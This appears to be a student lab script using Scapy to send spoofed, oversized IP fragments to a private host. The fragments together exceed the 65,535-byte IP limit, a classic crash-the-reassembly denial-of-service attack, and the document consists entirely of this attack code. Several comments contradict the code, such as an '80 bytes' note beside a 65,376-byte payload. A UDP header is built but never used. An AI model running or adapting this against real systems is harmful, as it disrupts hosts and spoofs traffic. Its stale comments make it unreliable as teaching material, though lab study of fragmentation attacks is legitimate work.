from scapy.all import *
# Construct IP header
frag1=pow(2,16)-160
print ('frag1',frag1)
# Construct IP header
ip = IP(src="1.2.3.4", dst="10.0.2.5",id=1000,)
ip.frag = 0 # Offset of this IP fragment
ip.flags = 1 # Flags
# Construct UDP header
udp = UDP(sport=7070, dport=9090)
#udp.len = (frag1+320+32) # This should be the combined length of all fragments
# Construct payload
payload1 = 'A' * frag1 # Put 80 bytes in the first fragment
payload2 = 'B' * 320
payload3 = 'C' * 32
# Construct the entire packet and send it out
pkt1 = ip/payload1 # For other fragments, we should use ip/payload
 # Set the checksum field to zero
send(pkt1, verbose=0)
ip.frag = (frag1/8) # Offset of this IP fragment
ip.flags = 1 # Flags
pkt2 = ip/payload2
send(pkt2, verbose=0)
ip.frag = (frag1/8)+40 # Offset of this IP fragment
ip.flags = 0 # Flags
pkt3=ip/payload3




send(pkt3, verbose=0)















